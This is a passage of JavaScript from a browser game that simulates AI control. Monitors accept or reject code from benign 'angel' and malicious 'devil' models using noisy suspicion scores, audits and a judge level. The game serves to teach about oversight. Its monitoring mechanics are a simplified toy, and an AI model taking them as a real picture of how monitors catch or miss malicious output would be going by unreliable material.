                    auditedCount++;
                    // Add cost of this audit at current Model Organism level
                    const auditCost = 1000 * Math.pow(2, modelOrganismLevel);
                    totalAuditCost += auditCost;
                    // Flag devil for rest of experiment
                    devilSuppressedExperiment = currentExperiment;
                } else {
                    result = 'REJECT';
                    className = 'rejecting';
                    feedback = '  '; // Space reserved for emoji
                    rejectedCount++;
                }
                
                devilClassification.textContent = result + feedback;
                devilClassification.className = `classification ${className}`;
                devilClassificationShown = true;
            }
            
            updateDisplay();
        }
        
        function togglePause() {
            isPaused = !isPaused;
            const pauseBtn = document.getElementById('pauseBtn');
            pauseBtn.textContent = isPaused ? 'Resume' : 'Pause';
            
            // Disable/enable manual controls based on pause state
            updateManualControlsState();
            
            if (!isPaused) {
                // Reset lastTime when resuming to avoid large time jump
                lastTime = Date.now();
            }
        }
        
        function updateManualControlsState() {
            const acceptBtn = document.querySelector('.accept-btn');
            const rejectBtn = document.querySelector('.reject-btn');
            
            if (automatedDecisionsLevel === 0) { // Only in manual mode
                const shouldDisable = isPaused || groundTruthTimeout !== null;
                acceptBtn.disabled = shouldDisable;
                rejectBtn.disabled = shouldDisable;
                acceptBtn.style.opacity = shouldDisable ? '0.5' : '1';
                rejectBtn.style.opacity = shouldDisable ? '0.5' : '1';
                acceptBtn.style.cursor = shouldDisable ? 'not-allowed' : 'pointer';
                rejectBtn.style.cursor = shouldDisable ? 'not-allowed' : 'pointer';
            }
        }

        // Game loop
        function gameLoop() {
            const currentTime = Date.now();
            
            if (!isPaused) {
                const deltaTime = (currentTime - lastTime) * speed;
                lastTime = currentTime;
                
                // Update AI level (1% per day = 0.01 per day)
                const dailyGrowthRate = 0.01;
                const msPerDay = 5000; // 5 seconds = 1 day for faster visualization
                
                aiLevel *= Math.pow(1 + dailyGrowthRate, deltaTime / msPerDay);
                
                // Update day progress (with inference speed multiplier)
                const inferenceSpeedMultiplier = Math.pow(1.5, inferenceSpeedLevel);
                dayProgress += (deltaTime / msPerDay) * inferenceSpeedMultiplier;
                
                // Start new day
                if (dayProgress >= 1) {
                    dayProgress = 0;
                    dayCount++;
                    
                    // Only advance step when angel generates (even days) and automated decisions is active
                    if (dayCount % 2 === angelDayOffset && automatedDecisionsLevel > 0) {
                        currentStep++;
                        
                        // Add cost for each step ($1 per step)
                        totalModelCost += 1;
                        
                        // Check if we need to start a new experiment (20 steps per experiment)
                        if (currentStep > 20) {
                            currentStep = 1;
                            currentExperiment++;
                        }
                    }
                    
                    currentDate.setDate(currentDate.getDate() + 1);
                    generateDailyRandom();
                }
                
                // Classify at 1/4 through the day
                if (dayProgress >= 0.25) {
                    classifyRandom();
                }
                
                updateDisplay();
            }
            
            requestAnimationFrame(gameLoop);
        }
        
        // Start the game loop
        gameLoop();
        
        // Generate initial random number
        generateDailyRandom();
        
        // Initialize monitoring game
        generateMonitoringOutput();
        updateManualControlsState();
        
        function generateJudgeInformedScore(modelType, isNormalized) {
            if (isNormalized) {
                // For normalized scores: use triangular distributions
                const judgeWeight = (judgeLevelValue - 1) / 4; // 0 to 1 based on judge level (1-5 maps to 0-1)
                const uniformWeight = 1 - judgeWeight;
                
                let informedScore;
                if (modelType === 'angel') {
                    // Benign: pdf proportional to x (higher values more likely)
                    informedScore = Math.sqrt(Math.random()); // Transforms uniform to triangular (increasing)
                } else {
                    // Malicious: pdf proportional to (1-x) (lower values more likely)  
                    informedScore = 1 - Math.sqrt(Math.random()); // Transforms uniform to triangular (decreasing)
                }
                
                // Linear combination with uniform distribution
                const uniformScore = Math.random();
                return judgeWeight * informedScore + uniformWeight * uniformScore;
            } else {
                // For unnormalized: this function shouldn't be called, but return 0 as fallback
                return 0;
            }
        }
        
        function generateMonitoringOutput() {
            // Choose random model type
            currentMonitoringModel = Math.random() < 0.5 ? 'angel' : 'devil';
            
            // Generate random legitimacy score with judge signal
            let legitimacyScore;
            if (normalizedScoresLevel > 0) {
                // Normalized: use judge-informed distribution
                legitimacyScore = generateJudgeInformedScore(currentMonitoringModel, true);
            } else {
                // Unnormalized: Gaussian * 10 with judge shift
                const baseScore = (Math.random() + Math.random() + Math.random() + Math.random() + 
                                  Math.random() + Math.random() - 3) * 10;
                const judgeShift = currentMonitoringModel === 'angel' ? 
                    2 * judgeLevelValue : -2 * judgeLevelValue;
                legitimacyScore = baseScore + judgeShift;
            }
            
            // Generate variable number of code lines based on complexity
            const baseLines = getFibonacci(codeComplexityLevel);
            const numLines = Math.max(2, Math.min(baseLines, 8)); // 2-8 lines max for display
            const codeLines = [];
            
            if (currentMonitoringModel === 'devil') {
                // For malicious models, include one obvious malicious line
                const maliciousLine = maliciousCodeLines[Math.floor(Math.random() * maliciousCodeLines.length)].substring(0, 80);
                const maliciousPosition = Math.floor(Math.random() * numLines);
                
                // Generate all lines
                for (let i = 0; i < numLines; i++) {
                    if (i === maliciousPosition) {
                        codeLines.push(maliciousLine);
                    } else {
                        codeLines.push(sampleCodeLines[Math.floor(Math.random() * sampleCodeLines.length)].substring(0, 80));
                    }
                }
            } else {
                // For benign models, use only regular code lines
                for (let i = 0; i < numLines; i++) {
                    codeLines.push(sampleCodeLines[Math.floor(Math.random() * sampleCodeLines.length)].substring(0, 80));
                }
            }
            
            // Update display
            const codeHtml = codeLines.map(line => `<div>${line}</div>`).join('') + '<div>...</div>';
            document.getElementById('codeOutput').innerHTML = codeHtml;
            document.getElementById('suspiciousnessValue').textContent = 
                normalizedScoresLevel > 0 ? (legitimacyScore * 100).toFixed(1) + '%' : legitimacyScore.toFixed(1);
            
            // Reset ground truth display only in manual mode
            if (automatedDecisionsLevel === 0) {
                document.getElementById('modelIdentityInline').textContent = 'Ground Truth: ???';
            }
        }
        
        function handleMonitoringDecision(decision) {
            console.log(`Player ${decision}ed a ${currentMonitoringModel}`);
            console.log(`Automated decisions level: ${automatedDecisionsLevel}`);
            
            // Clear any existing timeout
            if (groundTruthTimeout) {
                clearTimeout(groundTruthTimeout);
            }
            
            // Show ground truth immediately in the inline display (only in manual mode)
            if (automatedDecisionsLevel === 0) {
                const groundTruthText = currentMonitoringModel === 'angel' ? 
                    'Ground Truth: Benign üòá' : 'Ground Truth: Malicious üòà';
                document.getElementById('modelIdentityInline').textContent = groundTruthText;
                console.log(`Showing ground truth: ${groundTruthText}`);
            }
            
            // Track monitoring accuracy
            if ((currentMonitoringModel === 'angel' && decision === 'accept') ||
                (currentMonitoringModel === 'devil' && decision === 'reject')) {
                monitoringGoodClassifications++;
            } else {
                monitoringBadClassifications++;
            }
            
            // Update monitoring stats
            updateMonitoringStats();
            
            // Generate new output after 1 second
            console.log('Setting timeout for new output generation');
            groundTruthTimeout = setTimeout(() => {
                console.log('Timeout fired, generating new output');
                generateMonitoringOutput();
                groundTruthTimeout = null; // Clear timeout reference
                updateManualControlsState(); // Re-enable buttons
            }, 1000);
            
            // Disable buttons during delay (call after setting timeout)
            updateManualControlsState();
        }
        
        function updateMonitoringStats() {
            const netAccuracy = monitoringGoodClassifications - monitoringBadClassifications;
            document.getElementById('netAccuracy').innerHTML = `<strong>${netAccuracy}</strong>`;
        }
    </script>
</body>
</html>